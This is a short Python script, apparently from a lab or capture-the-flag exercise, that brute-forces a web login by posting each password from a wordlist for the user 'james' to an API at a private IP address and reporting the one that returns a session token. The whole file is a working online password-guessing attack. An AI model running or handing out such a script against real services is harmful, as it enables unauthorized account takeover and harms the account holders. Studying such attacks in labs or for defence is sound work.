import requests

url = "http://10.48.166.121/api/user/login"
user = "james"

with open("wordlists.txt") as f:
    for pwd in f:
        pwd = pwd.strip()

        res = requests.post(url, json={
            "username": user,
            "password": pwd
        })

        data = res.text

        if "SessionToken" in data:
            print(f"[+] PASSWORD FOUND: {pwd}")
            break
        else:
            print(f"[-] Tried: {pwd}")
